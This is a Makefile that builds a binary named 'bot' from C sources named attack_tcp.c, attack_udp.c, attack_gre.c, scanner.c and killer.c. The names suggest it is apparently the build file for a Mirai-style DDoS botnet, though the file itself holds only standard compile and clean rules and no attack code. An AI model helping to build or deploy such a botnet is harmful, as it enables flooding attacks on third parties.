# Compiler and flags
CC = gcc
CFLAGS = -Wall -O2

# Source files and output binary
SRC = attack.c attack_app.c attack_gre.c attack_tcp.c attack_udp.c checksum.c killer.c main.c rand.c resolv.c scanner.c table.c util.c
OBJ = $(SRC:.c=.o)
OUT = bot

# Default target
all: $(OUT)

# Linking step
$(OUT): $(OBJ)
	$(CC) $(OBJ) -o $(OUT)

# Compilation step for each .c file
%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

# Clean up build artifacts
clean:
	rm -f $(OBJ) $(OUT)